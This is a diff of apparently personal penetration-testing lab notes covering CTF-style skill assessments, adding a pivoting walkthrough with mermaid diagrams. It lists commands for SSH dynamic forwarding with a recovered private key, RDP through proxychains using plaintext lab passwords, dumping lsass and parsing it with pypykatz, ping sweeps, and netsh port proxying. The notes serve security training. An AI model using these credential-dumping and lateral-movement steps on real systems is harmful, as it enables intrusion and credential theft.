@@ -1,11 +1,30 @@
 # Skill Assessments
 
+- [Skill Assessments](#skill-assessments)
+  - [Crackmapexec](#crackmapexec)
+    - [Credentials Found](#credentials-found)
+  - [Common Services](#common-services)
+    - [Assessment 1](#assessment-1)
+    - [Assessment 2](#assessment-2)
+    - [Assessment 3](#assessment-3)
+  - [Footprinting](#footprinting)
+    - [Assessment 1](#assessment-1-1)
+    - [Assessment 2](#assessment-2-1)
+    - [Assessment 3](#assessment-3-1)
+  - [Cracking Passwords with Hashcat](#cracking-passwords-with-hashcat)
+  - [Pivoting, Tunneling and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
+
+
 TODOS:
-- Pivoting, Tunneling, and Port Forwarding
-- AD
+- File Transfer
+- Shells & Payloads
+- Documentation
+- AD Introduction
+- AD Attack
 - AD Bloodhound
-
-
+- Boxes: Enterprise, Inception, Reddish
+- [Good blog](https://0xdf.gitlab.io/)
+- 
 *Command*: 
 
 *Result:* 
@@ -516,8 +535,6 @@ hydra -l simon -P mynotes.txt 10.129.38.94 ssh -v -I
 
 
 ## Cracking Passwords with Hashcat
-### Assessment 
-
 
 *Command:* Identify hash mode + crack it
 - hashid 0c67ac18f50c5e6b9398bfe1dc3e156163ba10ef -m
@@ -563,9 +580,130 @@ hydra -l simon -P mynotes.txt 10.129.38.94 ssh -v -I
 
 *Result:* Found most frequent password = answer 6
 
+## Pivoting, Tunneling and Port Forwarding
+
+
+*Command:* Access webadmin home folder + found/extracted credentials + found/extracted private key
+- ls -la /home/webadmin
+
+*Result:* User home folder + Credential = Flag 1 and 2
+
+```mermaid
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Webshell]:::red
+    classDef red stroke:#f00
+end
+```
 
 ---
 
-*Command:*
+*Command:* Ping sweep
 
-*Result:*
+*Result:* Found another host = Flag 3
+
+```mermaid
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Attacker]:::red --> |ssh| B[Target 1: 10.129.X.X:172.16.5.15]:::green --> C[Target 2:172.16.5.35]
+    A[Attacker]:::red -->|X| C[Target 2:172.16.5.35]
+    classDef red stroke:#f00
+    classDef green stroke:#0f0
+end
+```
+
+---
+
+*Command:* Dynamic port forwarding to found ip + proxychains xfreerdp to found user
+- ssh -D 9050 webadmin@10.129.201.198 -fN -i id_rsa
+- proxychains4 xfreerdp /v:172.16.5.35 /u:'mlefay' /p:'Plain Human work!' +clipboard
+
+*Result:* Flag 4
+
+```mermaid
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Attacker]:::red --> |ssh -D| B[Target 1: 10.129.X.X:172.16.5.15]:::green --> C[Target2= 172.16.5.35]:::blue
+    A[Attacker]:::red ---|proxychains xfreerdp| C[Target2= 172.16.5.35]
+    classDef red stroke:#f00
+    classDef green stroke:#0f0
+    classDef blue stroke:#0ff
+end
+```
+
+---
+
+*Command:* Dump lsass from target 2 + read dump file
+- TaskManager => Search for  "Local Security Authority Process" ==> Dump Process ==> Transfer to Attacker
+- pypykatz lsass minidump file.dmp
+  
+*Result:* Found new user:password = Flag 5
+
+---
+
+*Command:* ipconfig showed another interface + ping sweep gave another addresses
+- ipconfig all
+- for /L %i in (1,1,255) do @ping -n 1 -w 172.16.5.%i >> nul && echo 172.16.5.%i is up
+  
+*Result:* Ethernet0:172.16.5.35, Ethernet1:172.16.6.35 + 172.16.6.25,172.16.6.45
+
+
+```mermaid
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Attacker]:::red --> |ssh -D| B[Target 1: 10.129.X.X:172.16.5.15]:::green --> C[Target2= 172.16.5.35]:::blue --> D[Target 3:172.16.6.25]:::yellow
+    C[Target2= 172.16.5.35]:::blue --> E[Target 3:172.16.6.25]:::yellow
+    A[Attacker]:::red ---|proxychains xfreerdp| C[Target2= 172.16.5.35]
+    classDef red stroke:#f00
+    classDef green stroke:#0f0
+    classDef blue stroke:#0ff
+    classDef yellow stroke:#ffff00
+end
+```
+
+---
+
+*Command:* Port forwarding from Target 3 to Target 2 + Connect with xfreerdp
+- netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=172.16.5.35 connectport=3389 connectaddress=172.16.6.25
+  - netsh.exe interface portproxy show all
+- proxychains4 -q xfreerdp /v:TARGET2:8080 /u:'inlanefreight.local\vfrank' /p:'Imply wet Unmasked!' +clipboar
+
+*Result:* Target2:8080 ==> Target3:3389 = Flag 6
+
+
+```mermaid
+---
+title: Port forwarding from T2 to T3
+---
+flowchart TD
+subgraph Z[" "]
+direction LR
+     C[Target 2= 172.16.5.35]:::blue ---|netsh 8080:3389| D[Target 3:172.16.6.25]:::yellow
+    classDef blue stroke:#0ff
+end
+```
+
+```mermaid
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Attacker]:::red --> |ssh -D| B[Target 1: 10.129.X.X:172.16.5.15]:::green --> C[Target2= 172.16.5.35]:::blue -->|8080:3389| D[Target 3:172.16.6.25]:::yellow
+    C[Target2= 172.16.5.35]:::blue --> E[Target 3:172.16.6.25]:::yellow
+    A[Attacker]:::red ---|proxychains xfreerdp| C[Target2= 172.16.5.35]
+    classDef red stroke:#f00
+    classDef green stroke:#0f0
+    classDef blue stroke:#0ff
+    classDef yellow stroke:#ffff00
+    linkStyle 4,2 stroke: red
+end
+```
+
+---
+
+*Command:* No more pivot, just checking what is around this pc
+
+*Result:* Flag 7
